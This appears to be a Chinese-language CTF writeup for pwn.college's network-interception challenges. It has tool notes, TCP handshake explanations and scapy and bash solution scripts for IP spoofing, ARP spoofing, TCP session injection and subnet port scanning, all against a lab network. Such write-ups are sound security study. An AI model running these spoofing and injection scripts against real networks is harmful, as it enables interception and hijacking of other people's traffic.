---
title: PWN-College-Web-4-Writeup
date: 2024-09-07 20:23:00
author: 美食家李老叭
img: https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20240606170337.png
top: false
hide: false
cover: false
coverImg: 
password: 
toc: true
mathjax: false
summary: CTF 
categories: CTF
tags:
    - Web
---
# pwn.college

https://pwn.college/intro-to-cybersecurity/intercepting-communication/

## 有价值的问题

### 1. 工具使用

`tcpdump`工具

| 选项  | 作用                                     |
| ----- | ---------------------------------------- |
| port  | 指定端口                                 |
| -nn   | 不解析主机名和服务名，直接显示ip和端口号 |
| -tttt | 显示详细的时间戳                         |
| -x    | 以十六进制和ascii格式显示数据包的内容    |
| -w    | 保存数据包                               |
|       |                                          |

`ip`工具

| 选项                            | 作用                                     |
| ------------------------------- | ---------------------------------------- |
| addr add `<ip>` dev `<devname>` | 为网卡添加多个ip地址                     |
| addr show                       | 不解析主机名和服务名，直接显示ip和端口号 |
|                                 |                                          |

`route`工具

| 选项 | 作用                 |
| ---- | -------------------- |
| -n   | 列举本机的系统路由表 |
|      |                      |
|      |                      |



`tmux`工具

| 选项                 | 作用                                                         |
| -------------------- | ------------------------------------------------------------ |
| new -s name          | 添加名为name的窗口                                           |
| attach -t name       | 链接名为name的窗口                                           |
| kill-session -t name | 删除为名name的窗口                                           |
| switch -t name       | 切换会话                                                     |
| `CTRL + B ` 和 `D`   | detach这个会话的快捷键，因为有的时候这个会话窗口正在执行命令，没办法通过命令执行的方式退出。 |
| ls                   | 显示所有会话                                                 |
| attach -t name       | 链接名为name的会话                                           |
|                      |                                                              |
|                      |                                                              |



`scapy`

| 序号 | 层名       |
| ---- | ---------- |
| 4    | 传输层     |
| 3    | 网络层     |
| 2    | 数据链路层 |
| 1    | 物理层     |

- **`sr()`**（Send and Receive）：

  - 发送三层数据包（如 IP、TCP、UDP 等），并等待一个或多个响应。通常用于需要查看发送数据包后的回应情况（如 ICMP 回应）。
  - 使用场景：发送一个或多个数据包，等待多个响应数据包，例如网络探测和扫描。

  **`sr1()`**（Send and Receive 1）：

  - 发送三层数据包，并只等待接收一个数据包的响应（第一个响应）。这是 `sr()` 的简化版本，只对第一个响应感兴趣。
  - 使用场景：例如发送 TCP SYN 包并期待收到第一个 SYN-ACK 响应，用于简单的通信。

  **`srp()`**（Send and Receive at Layer 2）：

  - 发送二层数据包（如以太网帧，ARP 请求等），并等待响应。适合处理链路层数据包（OSI 模型的第二层，如 Ethernet）。
  - 使用场景：例如 ARP 扫描和二层协议相关操作。

  **`send()`**：

  - 仅发送三层数据包，不等待任何响应。Scapy 会自动处理路由和二层信息（如以太网帧的封装）。
  - 使用场景：不需要关心是否有响应的情况，如只发送 ICMP 请求或构造攻击流量。

  **`sendp()`**：

  - 发送二层数据包，不等待响应。直接处理链路层（如以太网帧），而不是依赖系统路由。
  - 使用场景：在需要直接控制链路层数据包时，如发送自定义的以太网帧。





### 2. 三次握手和四次挥手的数据包

####  **三次握手（建立连接）**

TCP 的三次握手用于确保双方都知道彼此的存在，并且可以正确同步各自的序列号和确认号，从而保证数据的可靠传输。

1. **第一次握手（SYN）**：
   - 客户端发送一个 `SYN`（同步序列号）请求给服务器，表明客户端希望建立连接，并携带初始序列号（`seq`）。
2. **第二次握手（SYN-ACK）**：
   - 服务器收到 `SYN` 后，回复一个带有 `SYN` 和 `ACK`（确认）标志的响应，表示它同意建立连接，并且确认了客户端的初始序列号。服务器还会发送自己的初始序列号。
3. **第三次握手（ACK）**：
   - 客户端收到 `SYN-ACK` 后，再回复一个 `ACK`，表示确认了服务器的初始序列号，并完成连接建立。

**四次挥手**：关闭 TCP 连接的过程通常称为“四次挥手”：

1. **第一步**：主动关闭方发送一个带有 FIN 标志的数据包。
2. **第二步**：被动关闭方接收到这个 FIN 数据包后，发送一个 ACK 确认。
3. **第三步**：被动关闭方发送自己的 FIN 数据包，表示它也完成了数据传输。
4. **第四步**：主动关闭方接收到 FIN 数据包后，发送一个 ACK 确认，连接关闭完成。

```txt

19:37:27.714010 ens33 In  IP 192.168.202.1.58238 > lebron-virtual-machine.12345: Flags [S], seq 3927600946, win 64240, options [mss 1460,nop,wscale 8,nop,nop,sackOK], length 0
	0x0000:  4500 0034 8081 4000 4006 a460 c0a8 ca01  E..4..@.@..`....
	0x0010:  c0a8 ca8f e37e 3039 ea1a 6f32 0000 0000  .....~09..o2....
	0x0020:  8002 faf0 f137 0000 0204 05b4 0103 0308  .....7..........
	0x0030:  0101 0402                                ....
19:37:27.714030 ens33 Out IP lebron-virtual-machine.12345 > 192.168.202.1.58238: Flags [S.], seq 3152951559, ack 3927600947, win 64240, options [mss 1460,nop,nop,sackOK,nop,wscale 7], length 0
	0x0000:  4500 0034 0000 4000 4006 24e2 c0a8 ca8f  E..4..@.@.$.....
	0x0010:  c0a8 ca01 3039 e37e bbee 3907 ea1a 6f33  ....09.~..9...o3
	0x0020:  8012 faf0 1609 0000 0204 05b4 0101 0402  ................
	0x0030:  0103 0307                                ....
19:37:27.714280 ens33 In  IP 192.168.202.1.58238 > lebron-virtual-machine.12345: Flags [.], ack 1, win 4106, length 0
	0x0000:  4500 0028 8082 4000 4006 a46b c0a8 ca01  E..(..@.@..k....
	0x0010:  c0a8 ca8f e37e 3039 ea1a 6f33 bbee 3908  .....~09..o3..9.
	0x0020:  5010 100a 27eb 0000 0000 0000 0000       P...'.........
19:37:27.731273 ens33 In  IP 192.168.202.1.58238 > lebron-virtual-machine.12345: Flags [P.], seq 1:86, ack 1, win 4106, length 85
	0x0000:  4500 007d 8083 4000 4006 a415 c0a8 ca01  E..}..@.@.......
	0x0010:  c0a8 ca8f e37e 3039 ea1a 6f33 bbee 3908  .....~09..o3..9.
	0x0020:  5018 100a c4a4 0000 4745 5420 2f20 4854  P.......GET./.HT
	0x0030:  5450 2f31 2e31 0d0a 486f 7374 3a20 3139  TP/1.1..Host:.19
	0x0040:  322e 3136 382e 3230 322e 3134 333a 3132  2.168.202.143:12
	0x0050:  3334 350d 0a55 7365 722d 4167 656e 743a  345..User-Agent:
	0x0060:  2063 7572 6c2f 372e 3535 2e31 0d0a 4163  .curl/7.55.1..Ac
	0x0070:  6365 7074 3a20 2a2f 2a0d 0a0d 0a         cept:.*/*....
19:37:27.731291 ens33 Out IP lebron-virtual-machine.12345 > 192.168.202.1.58238: Flags [.], ack 86, win 502, length 0
	0x0000:  4500 0028 2d5f 4000 4006 f78e c0a8 ca8f  E..(-_@.@.......
	0x0010:  c0a8 ca01 3039 e37e bbee 3908 ea1a 6f88  ....09.~..9...o.
	0x0020:  5010 01f6 15fd 0000                      P.......
19:37:45.859884 ens33 Out IP lebron-virtual-machine.12345 > 192.168.202.1.58238: Flags [F.], seq 1, ack 86, win 502, length 0
	0x0000:  4500 0028 2d60 4000 4006 f78d c0a8 ca8f  E..(-`@.@.......
	0x0010:  c0a8 ca01 3039 e37e bbee 3908 ea1a 6f88  ....09.~..9...o.
	0x0020:  5011 01f6 15fd 0000                      P.......
19:37:45.860242 ens33 In  IP 192.168.202.1.58238 > lebron-virtual-machine.12345: Flags [.], ack 2, win 4106, length 0
	0x0000:  4500 0028 8084 4000 4006 a469 c0a8 ca01  E..(..@.@..i....
	0x0010:  c0a8 ca8f e37e 3039 ea1a 6f88 bbee 3909  .....~09..o...9.
	0x0020:  5010 100a 2795 0000 0000 0000 0000       P...'.........
19:37:49.128674 ens33 In  IP 192.168.202.1.58238 > lebron-virtual-machine.12345: Flags [F.], seq 86, ack 2, win 4106, length 0
	0x0000:  4500 0028 8085 4000 4006 a468 c0a8 ca01  E..(..@.@..h....
	0x0010:  c0a8 ca8f e37e 3039 ea1a 6f88 bbee 3909  .....~09..o...9.
	0x0020:  5011 100a 2794 0000 0000 0000 0000       P...'.........
19:37:49.128690 ens33 Out IP lebron-virtual-machine.12345 > 192.168.202.1.58238: Flags [.], ack 87, win 502, length 0
	0x0000:  4500 0028 0000 4000 4006 24ee c0a8 ca8f  E..(..@.@.$.....
	0x0010:  c0a8 ca01 3039 e37e bbee 3909 ea1a 6f89  ....09.~..9...o.
	0x0020:  5010 01f6 35a8 0000                      P...5...

```

### 3. 为什么是三次握手和四次挥手？

#### **为什么是三次握手？**

- **最少次数确保同步**：三次握手足以保证双方知道对方的序列号、确认号，并且确认连接的可靠性。如果只有两次握手，客户端无法确认服务器收到了它的 SYN 并正确理解了它的初始序列号，服务器也无法确认客户端知道它的序列号。
- **效率最优**：三次握手是实现可靠数据传输的最小次数。如果增加更多握手次数，不会显著提高连接的可靠性，反而会增加不必要的延迟。

#### 为什么是四次挥手？

- **双向关闭**：TCP 连接是双向的，每一方都需要分别关闭各自的发送通道。客户端和服务器需要独立发送和确认 `FIN`，因此每一方需要两步：发送 `FIN` 和确认对方的 `FIN`。
- **避免数据丢失**：四次挥手保证了双方都有机会在关闭连接前完成数据传输。特别是服务器在收到客户端的 `FIN` 后，可能还有未发送的数据需要发送出去，这时它可以先回复 `ACK`，然后继续发送数据，等发送完毕后再发送 `FIN`。如果服务器在收到客户端的 `FIN` 数据包后还有未发送的数据，客户端**仍会继续确认服务器发送的数据包**，即使客户端已经发送了 `FIN` 来关闭自己到服务器的传输通道。

### 4. 一个主机可以绑定多个ip地址。

**虚拟主机**：在同一物理服务器上运行多个网站，每个网站绑定不同的 IP 地址。

**多网络配置**：主机可以同时连接多个网络，并在不同网络间转发流量。

**负载均衡**：使用多个 IP 地址以支持负载均衡应用。

### 5. send 和sendp的区别

`Scapy` 中的 `sendp` 和 `send` 都是用于发送数据包的函数，但它们的作用范围不同，主要区别在于**协议层**的不同：

#### 1. **`sendp`**：

- **用于发送链路层（数据链路层）报文**，包括以太网帧。
- 需要**指定网络接口**（如 `eth0`），因为在链路层发送报文时，需要明确指定从哪个物理接口发送。
- 适用于发送包含 `Ether` 头部的原始帧，或进行更低级别的网络通信，如自定义的以太网帧

#### 2. **`send`**：

- **用于发送网络层（IP层）报文**，如 ICMP、TCP、UDP 数据包。
- 不需要指定网络接口，Scapy 会自动选择合适的接口（通常是根据路由表决定的）。
- 适用于发送网络层以上的报文，不包括以太网头部。





### 6. lo(Loopback)和eth0接口的区别

##### **`eth0` 接口：**

- **`eth0` 是以太网接口**，它负责连接你的主机和外部网络。数据包通过这个接口与外部设备、路由器、交换机等通信。`eth0` 接口使用你配置的 IPv4 地址 `10.0.0.2` 来和外部主机（例如 `10.0.0.3`）进行通信。
- **使用场景**：用于与其他网络设备通信，例如通过这个接口发送数据包到其他主机或接入外部网络。

##### **`lo` (Loopback) 接口：**

- **`lo` 接口是本地回环接口**，用于在同一台机器上测试和通信。通过 `lo` 发送的数据包永远不会离开本机，它只会在本地回环。因此，任何发送到 `127.0.0.1` 或本地回环的 IP 地址的数据包，都通过 `lo` 接口处理。
- **使用场景**：用于自测应用程序、开发和调试。例如，访问本机的服务时使用 `127.0.0.1`（本地 IP 地址）。

如果你使用 `Scapy` 的 `send()` 函数发送 IP 层数据包，而没有指定接口，系统会根据路由表自动选择合适的网络接口。这通常是基于目标 IP 地址来决定的。

#### 如何选择接口：

- 通过路由表：操作系统会检查路由表，基于目标 IP 地址找到最合适的出接口。例如：
  - 如果目标 IP 地址是本地回环地址（如 `127.0.0.1`），则数据包会通过 `lo`（回环接口）发送。
  - 如果目标 IP 地址是局域网中的其他主机（如 `10.0.0.3`），则数据包会通过 `eth0`（以太网接口）发送。



###

###



## level 13-----写着写着给我绕晕了。。。。

**关于ARP欺骗的，好像我之前上刚子（梁刚老师）的《产品实践课程》的时候，这个问题我就犯过一次**

**场景**：`10.0.0.4` 想要跟`10.0.0.2 `建立通信（4会发起tcp第三次握手给2），`10.0.0.3`想要获取他们之间的数据流，那么有两种方式，

- 一种是`10.0.0.3`发送arp相应包声称自己的mac地址是.2的mac地址，

- 一种是构造arp相应包，声称`10.0.0.2`的mac地址是`10.0.0.3`。（✔这种方式应该是观念上正确的）

  

这两种都正确吗？在这个场景中，`10.0.0.4`想要发起tcp三次握手，但他不知道`10.0.0.2`的mac地址，首先他会发起`ARP broadcast`询问谁有`10.0.0.2`的mac地址。

- 如果你采用第一种方式，你确实会收到`10.0.0.4`发来的tcp第一次握手的数据包。但是后续使用`scapy`构造的tcp第二次握手的应答数据包，却无法发送到`10.0.0.4`。---**这里不知道为什么**

```python
from scapy.all import TCP, sr1, IP, sniff, Ether, send, sendp

mac_2 = "36:11:33:c5:63:50"
mac_3 = "ea:5e:73:56:03:6f"
mac_4 = "b2:b3:5c:60:01:08"

def handle_packet(packet):
    if  "IP" in packet and "TCP" in packet["IP"]:

        if packet["TCP"].flags == "S":
            ether = Ether(src=mac_2,dst=mac_4)
            ip = IP(src="10.0.0.2",dst="10.0.0.4")
            tcp_ = TCP(seq=456132, ack=packet["TCP"].seq+1, flags="SA", dport=packet["TCP"].sport, sport=31337)
            send_packet = ether / ip / tcp_
            send_packet.show()
            tcp_3 = send(send_packet, iface="eth0")

        # 如果有 TCP 负载，打印负载信息
        if packet[TCP].payload:
            print("-" * 50)
            print(f"Payload: {bytes(packet[TCP].payload)}")
            print("-" * 50)

        
sniff(prn=handle_packet, iface="eth0")
```



## level 14

注意`ack=(pkt.seq + len(pkt[Raw].payload)`。 `ack`和符号标志位的`ACK`是不一样的

```python
from scapy.all import TCP, IP, sniff, Ether, send, sendp, Raw

mac_2 = "0a:be:cb:0c:2f:c3"
mac_3 = "4a:3c:5e:46:45:9e"
mac_4 = "7e:2b:6a:5e:37:b0"
mac_ = None

def handle_packet(packet):
    
    if  "IP" in packet and "TCP" in packet["IP"] and packet["IP"].src == "10.0.0.3" and \
        packet["IP"].dst == "10.0.0.4" and packet.haslayer(Raw) and b'COMMANDS:' in packet[Raw].load:

        ether = Ether(src=mac_2, dst=mac_3)
        ip = IP(src="10.0.0.4", dst="10.0.0.3")
        tcp_ = TCP(seq=packet[TCP].ack, ack=packet[TCP].seq+1, sport=packet[TCP].dport, dport=packet[TCP].sport)
        payload = Raw(b'FLAG\n')
        send_packet =  ip / tcp_ / payload
        sendp(send_packet, iface="eth0")

    # 如果有 TCP 负载，打印负载信息
    if packet.haslayer(TCP) and packet[TCP].payload:
        print("-" * 50)
        print(packet[Raw].load)
        print("-" * 50)


def inject(pkt):
    # Print packets
    if  "IP" in pkt and "TCP" in pkt["IP"]:
        print("--- PKT: ---")
        print(f"src: {pkt[IP].src}, dst: {pkt[IP].dst}")
        print(f"sport: {pkt[TCP].sport}, dport: {pkt[TCP].dport}")
        print(f"seq: {pkt.seq}, ack: {pkt.ack}")
        print(f"flags: {pkt[TCP].flags}")
        if(Raw in pkt):
            print(f"load: {pkt[Raw].load}")
            #pkt[TCP].dport pkt[IP].dst
            if(pkt[Raw].load[0] == ord("C")):
                sendp(Ether(src=pkt[Ether].dst, dst=pkt[Ether].src) / IP(src=pkt[IP].dst,
                dst=pkt[IP].src) / TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport, seq=pkt.ack, ack=(pkt.
                seq + len(pkt[Raw].payload)), flags="PA") / Raw(load="FLAG\n"), iface="eth0") # ack这个步骤没有加上len
                print(f"time: {pkt.time}\n")

sniff(prn=inject, iface="eth0")

```







## level 3

写bash脚本的能力还是要学习一下

```bash
# !/bin/sh
subnet="10.0.0"
port=31337

for ip in {0..255}; 
do
    target_ip="$subnet.$ip"
    echo "Trying $target_ip on port $port..." 
    response=$(nc -w 1 $target_ip 31337)
    if [ ! -z "$response" ];then
        echo "Connected to $target_ip"
        echo "Flag: $response"
        break
    fi
done
```





## level 4

```python
import socket
import threading

# 远程子网和端口
subnet = "10.0"
port = 31337
max_threads = 100  # 最大线程数

# 尝试连接给定的IP和端口
def try_connect(ip):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(1)  # 设置超时时间为1秒
            s.connect((ip, port))
            print(f"Connected to {ip} on port {port}")
            # 接收 flag 或响应
            response = s.recv(1024)
            print(f"Flag: {response.decode('utf-8')}")
    except socket.timeout:
        pass
    except ConnectionRefusedError:
        pass
    except Exception as e:
        print(f"Error connecting to {ip}: {e}")

# 线程池管理
def threader():
    while True:
        ip = q.get()
        try_connect(ip)
        q.task_done()

# 构建IP地址池
def generate_ips():
    for i in range(1, 256):
        for j in range(1, 256):
            yield f"{subnet}.{i}.{j}"

# 主函数
if __name__ == "__main__":
    from queue import Queue

    q = Queue()

    # 创建多个线程
    for _ in range(max_threads):
        t = threading.Thread(target=threader)
        t.daemon = True  # 设置为守护线程
        t.start()

    # 将所有IP地址放入队列
    for ip in generate_ips():
        q.put(ip)

    # 等待所有任务完成
    q.join()

    print("Scanning complete.")

```

## level 6

使用tcpdump将网络数据包保存成`test.pcap`,再用wireshark打开，查看tcp流的数据就能够得到完成的flag文件了

## level 7

```text
I don't know enough to speak on real world feasibility/mitigations/etc but I can talk about how the challenge works.

`I'm going to assume that when I add the IP, it sends a request to the router, telling it to update its table for what IP is tied to which device.`

No request is sent when you configure your IP, you're simply telling your own machine that it should consider itself as 10.0.0.2 and behave accordingly. This means that it will start answering ARP requests and accepting packets for 10.0.0.2.
That first part is important. 10.0.0.4 is set up to ARP-query for 10.0.0.2 every second, and since our host now thinks that it has IP address 10.0.0.2, it replies with an is-at. 10.0.0.4 then simply believes our ARP response and redirects its traffic to us.

It's important to note that, at least within this challenge, there is no authoritative list of who has which IP address. There is no router. Instead, IPs are simply resolved by asking who has them and trusting that you get a truthful response.
```

这个里面是没有路由器的，但是为什么我发送arp的欺骗包，在这一关中是不起作用的呢？

如果 **IP 地址 10.0.0.3** 的主机绑定了 **10.0.0.2** 的 IP 地址，而另一台主机 **10.0.0.4** 想与 **10.0.0.2** 建立连接，网络流量的具体走向取决于 ARP 解析过程以及主机和交换机的配置。下面是详细分析：

#### 1. **正常的 ARP 解析流程**

在没有 IP 地址冲突或 ARP 欺骗的情况下，当 **10.0.0.4** 想与 **10.0.0.2** 建立连接时，它需要首先通过 ARP（地址解析协议）解析 **10.0.0.2** 的 MAC 地址。这是正常流程的简要说明：

1. **10.0.0.4** 发送一个 **ARP 请求**，询问网络上 “谁是 10.0.0.2？请告诉我 10.0.0.2 的 MAC 地址。”
2. 如果网络中有一台主机真正绑定了 **10.0.0.2**（例如原始的 **10.0.0.2** 主机），它会响应这个 ARP 请求，提供自己的 MAC 地址。
3. **10.0.0.4** 把这个 MAC 地址缓存在自己的 ARP 表中，并使用该 MAC 地址将后续的数据包发送到 **10.0.0.2**。

#### 2.**当 10.0.0.3 绑定了 10.0.0.2**

现在引入一个特殊情况：**10.0.0.3** 主机绑定了 **10.0.0.2** 的 IP 地址。这意味着 **10.0.0.3** 主机可以响应 ARP 请求，并声称它是 **10.0.0.2**。具体情况将取决于是否发生了 ARP 冲突或者 ARP 欺骗。

#### 情况 1：**ARP 请求被 10.0.0.3 抢先响应**

- 如果 **10.0.0.3** 绑定了 **10.0.0.2**，并且抢先响应了 **10.0.0.4** 的 ARP 请求，它会告诉 **10.0.0.4** “我是 10.0.0.2，我的 MAC 地址是 [10.0.0.3 的 MAC 地址]。”
- 由于 ARP 是无状态的，只要谁抢先响应，**10.0.0.4** 就会相信这个响应，并将 **10.0.0.2** 对应的 MAC 地址更新为 **10.0.0.3** 的 MAC 地址。
- 这样，**10.0.0.4** 后续发送给 **10.0.0.2** 的所有数据包都会发送到 **10.0.0.3**（因为 **10.0.0.4** 的 ARP 表中记录了 **10.0.0.2** 的 MAC 地址实际上是 **10.0.0.3** 的 MAC 地址）。

#### 情况 2：**10.0.0.2 的主机与 10.0.0.3 都响应了 ARP 请求**

- 如果网络中同时有真正的 **10.0.0.2** 和伪装的 **10.0.0.2**（即 **10.0.0.3** 绑定了 **10.0.0.2**），这就可能引发 **ARP 冲突**。

- 10.0.0.2 和 10.0.0.3 都可能响应 10.0.0.4 的 ARP 请求。此时，结果取决于谁先响应以及交换机或网络的处理方式：

  - **如果 10.0.0.3 先响应**，则 **10.0.0.4** 可能会认为 **10.0.0.2** 是 **10.0.0.3**，并将数据包发往 **10.0.0.3**。
  - **如果真正的 10.0.0.2 响应更快**，则 **10.0.0.4** 仍然会向正确的主机发送数据。

  由于 ARP 是动态的，网络中的设备可以随时发送更新的 ARP 响应。因此，ARP 冲突可能会导致通信不稳定，甚至反复切换目标主机。

#### 情况 3：**10.0.0.3 主动进行 ARP 欺骗**

- 如果 **10.0.0.3** 不仅绑定了 **10.0.0.2**，还主动发送伪造的 **ARP 响应**，欺骗其他主机，使得它们的 ARP 表中记录的 **10.0.0.2** 对应的 MAC 地址是 **10.0.0.3** 的 MAC 地址，这种情况将会导致其他主机（包括 **10.0.0.4**）把数据包发送给 **10.0.0.3**。
- 这种攻击方式叫 **ARP 欺骗**，常见于中间人攻击（MITM）。

### 3. **总结数据包发送过程**

在你描述的情况下，当 **10.0.0.3** 绑定了 **10.0.0.2**，且 **10.0.0.4** 想与 **10.0.0.2** 建立连接，以下情况可能会发生：

- **如果 10.0.0.3 抢先响应 ARP 请求**，或通过 ARP 欺骗修改了 **10.0.0.4** 的 ARP 表，**10.0.0.4** 会将数据包发送给 **10.0.0.3**。即使数据包的目标 IP 是 **10.0.0.2**，它们会通过 **10.0.0.3** 的 MAC 地址进行传输。
- **如果没有 ARP 冲突且真正的 10.0.0.2 响应了 ARP 请求**，则 **10.0.0.4** 的数据包会发送给真正的 **10.0.0.2**，不会被 **10.0.0.3** 接收到。

因此，**10.0.0.3** 绑定 **10.0.0.2** 后，能否接收到 **10.0.0.4** 发送给 **10.0.0.2** 的数据包，取决于 ARP 表的状态以及 ARP 请求的响应情况。通过 ARP 欺骗，**10.0.0.3** 可以成功劫持流量。



## level 8

```python
from scapy.all import Ether, IP, sendp
# 构建以太网帧，设置type字段为0xFFFF
eth = Ether(dst="ff:ff:ff:ff:ff:ff", type=0xFFFF)
# 构建IP层，目标地址为10.0.0.3
ip = IP(dst="10.0.0.3")
# 构建完整的以太网 + IP 报文
packet = eth / ip
# 显示报文结构
packet.show()
# 发送报文
sendp(packet, iface="eth0")
```





## level 11

完整的tcp三次握手

```python
from scapy.all import Ether, IP, TCP, sendp, send, sr1
# 构建IP层，目标地址为10.0.0.3
ip = IP(dst="10.0.0.3", src="10.0.0.2")
tcp = TCP(sport=31337, dport=31337, seq=31337, flags="S")
# 构建完整的以太网 + IP 报文
packet = ip / tcp 
# 显示报文结构
packet.show()
# 发送报文
syn_ack = sr1(packet,iface="eth0")

print(f"syn_ack is :{syn_ack}") # 接收的报文flag 为[SA]

tcp = TCP(sport=31337, dport=31337, seq=syn_ack.ack, ack=syn_ack.seq+1, flags="A")
# 构建完整的以太网 + IP 报文
packet = ip / tcp 
# 显示报文结构
packet.show()
# 发送报文
send(packet,iface="eth0")

```


## 


## 

